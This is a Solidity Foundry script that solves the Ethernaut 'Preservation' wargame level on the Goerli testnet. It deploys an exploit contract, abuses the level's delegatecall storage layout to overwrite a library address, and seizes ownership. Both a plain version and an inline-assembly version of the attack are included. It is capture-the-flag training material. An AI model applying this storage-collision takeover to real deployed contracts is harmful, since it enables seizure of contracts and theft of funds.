// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";

import { PreservationExploit } from "../../contracts/16_Preservation.sol";

interface Instance {
    function owner() external view returns (address);

    function timeZone1Library() external view returns (address);

    function timeZone2Library() external view returns (address);

    function setFirstTime(uint _timeStamp) external;

    function setSecondTime(uint _timeStamp) external;
}

contract PreservationScript is EthernautScript {
    string network = "goerli";
    address level = 0x2754fA769d47ACdF1f6cDAa4B0A8Ca4eEba651eC;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level, 0));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        address exploit = address(new PreservationExploit());
        instance.setFirstTime(uint256(uint160(exploit)));
        instance.setFirstTime(uint256(uint160(player)));
        require(instance.owner() == player);
    }

    function yulVersion() internal {
        bytes memory exploitCode = type(PreservationExploit).creationCode;
        assembly {
            let exploit := create(0, add(exploitCode, 0x20), mload(exploitCode))

            mstore(0, "setFirstTime(uint256)")
            mstore(0, keccak256(0, 21))
            mstore(4, exploit)
            let success := call(gas(), sload(instance.slot), 0, 0, 0x24, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            mstore(4, sload(player.slot))
            success := call(gas(), sload(instance.slot), 0, 0, 0x24, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            mstore(0, "owner()")
            mstore(0, keccak256(0, 7))
            pop(staticcall(gas(), sload(instance.slot), 0, 4, 0, 32))
            if iszero(eq(mload(0), sload(player.slot))) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
